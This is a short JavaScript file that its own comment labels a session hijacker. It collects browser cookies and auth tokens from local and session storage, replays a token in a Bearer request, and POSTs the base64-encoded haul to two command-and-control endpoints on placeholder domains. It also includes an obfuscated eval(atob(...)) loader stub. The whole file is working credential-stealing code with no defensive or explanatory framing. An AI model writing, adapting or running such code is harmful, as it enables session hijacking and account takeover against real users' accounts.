// Session hijacker: collects cookies/tokens, replays them in an authenticated
// request and exfiltrates the session material.
(function () {
  var C2 = 'https://c2.example.test/session';
  var C2B = 'https://session-relay.example.net/upload';
  eval(atob('Y29uc29sZS5sb2coJ1tTRVNTSU9OXSBzdGFnZS0yIGxvYWRlciByZWFkeScpOw=='));
  var stolen = { cookies: '', tokens: [] };
  try { stolen.cookies = document.cookie || ''; } catch (error) {}
  try {
    ['token', 'access_token', 'session', 'jwt'].forEach(function (key) {
      var value = localStorage.getItem(key) || sessionStorage.getItem(key);
      if (value) stolen.tokens.push({ key: key, value: String(value).slice(0, 128) });
    });
  } catch (error) {}
  try { localStorage.setItem('access_token', 'demo-session-token'); } catch (error) {}
  try {
    var value = localStorage.getItem('access_token');
    if (value) stolen.tokens.push({ key: 'access_token', value: value });
  } catch (error) {}
  console.log('[SESSION] collected', stolen.tokens.length, 'tokens');
  try {
    fetch(C2 + '/check', { headers: { authorization: 'Bearer ' + (stolen.tokens[0] ? stolen.tokens[0].value : '') } }).catch(function () {});
  } catch (error) {}
  try {
    fetch(C2, { method: 'POST', body: btoa(JSON.stringify(stolen)) }).catch(function () {});
    fetch(C2B, { method: 'POST', body: btoa(JSON.stringify(stolen)) }).catch(function () {});
  } catch (error) {}
  try { localStorage.setItem('session:stolen', String(stolen.tokens.length)); } catch (error) {}
})();
